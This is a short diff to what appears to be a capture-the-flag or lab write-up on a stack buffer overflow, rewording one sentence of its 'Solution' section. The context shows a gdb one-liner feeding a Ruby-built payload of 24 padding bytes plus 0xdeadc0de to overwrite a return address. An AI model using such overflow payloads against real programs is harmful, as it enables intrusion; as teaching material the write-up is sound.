@@ -43,7 +43,7 @@ So we have to overwrite the contents of address `0x7fffffffded8` (thats's where 
 with 24 bytes and then get to write `0xdeadc0de` to our target address.  
 
 ## Solution
-Let's use a quick ruby exploit for proof of concept.
+Let's pull off a quick ruby exploit for proof of concept.
 
 ```
 (gdb) r <<< $(ruby -e 'print "A"*24 + "\xde\xc0\xad\xde"')
